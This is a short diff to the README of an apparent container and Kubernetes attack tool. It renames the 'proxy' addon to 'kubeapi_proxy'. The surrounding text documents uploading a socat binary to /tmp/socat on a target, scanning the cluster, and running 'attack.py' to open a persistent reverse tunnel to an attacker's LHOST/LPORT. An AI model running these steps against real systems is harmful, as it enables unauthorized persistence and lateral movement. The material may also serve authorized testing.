@@ -95,7 +95,7 @@ Performs a high-speed network scan to discover other services in the cluster.
 
 ### 7. Binary Upload (`upload_socat`)
 
-Uploads a local `socat` binary to the target container. This is a prerequisite for the `proxy` addon.
+Uploads a local `socat` binary to the target container. This is a prerequisite for the `kubeapi_proxy` addon.
 
 - **Upload:**
   Reads `binaries/socat` locally and uploads it to `/tmp/socat` on the target.
@@ -109,7 +109,7 @@ Creates a persistent reverse tunnel using `socat`. This allows you to tunnel tra
 
 - **Start Proxy:**
   ```bash
-  python3 attack.py --url <URL> --addon proxy <LHOST> <LPORT>
+  python3 attack.py --url <URL> --addon kubeapi_proxy <LHOST> <LPORT>
   ```
   *Requires `upload_socat` to be run first.*
 
